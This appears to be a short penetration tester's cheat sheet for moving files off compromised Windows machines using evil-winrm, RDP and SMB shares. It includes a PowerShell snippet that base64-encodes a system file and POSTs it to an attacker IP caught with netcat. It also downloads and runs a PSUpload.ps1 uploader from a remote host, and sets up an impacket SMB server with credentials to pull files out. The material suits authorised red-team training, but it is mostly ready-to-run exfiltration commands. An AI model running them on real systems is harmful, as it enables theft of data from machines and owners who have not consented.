
### Windows:

1. inside evil-winrm
```
download 'path/to/file'
```

2. using smbserver/xfreerdp
```
copy file \\tsclient\share\file
```

### Powershell Base64 Encoding

1. base64 upload `
```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
catch payload
```shell
nc -lvnp 8000

echo <base64-string> | base64 -d -w 0 > hosts
```
 
### method 2. PSUpload.PS1

  start listener
```
python3 -m uploadserver 8000
```
 2.  invoke-fileupload.ps1 script
 https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1
```
 Invoke-WebRequest http://172.16.8.120:1337/PSUpload.ps1 -OutFile psupload.ps1  -UseBasicParsing
```

```
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\<loc>
```

### using impacket-smbserver.py
```
smbserver.py -smb2support share-name $(pwd) -username vipa0z -password 54039852
```

```
net use \\10.10.16.32  /user:vipa0z 54039852
```

```
copy file \\ip\share\file
```